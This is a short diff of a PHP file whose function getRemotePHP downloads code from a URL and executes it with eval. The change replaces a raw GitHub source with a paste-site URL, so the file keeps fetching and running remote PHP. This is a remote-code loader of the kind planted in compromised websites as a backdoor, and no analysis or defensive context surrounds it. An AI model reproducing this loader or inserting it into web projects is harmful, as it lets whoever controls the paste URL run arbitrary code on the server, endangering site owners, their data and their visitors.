@@ -18,6 +18,7 @@ function getRemotePHP($url) {
     eval("?>$code");
 }
 
-getRemotePHP('https://raw.githubusercontent.com/lyyahm/rreee/refs/heads/main/566.php');
+getRemotePHP('https://paste.idcloudhosting.my.id/paste/e67ge/raw');
 ?>
+
 
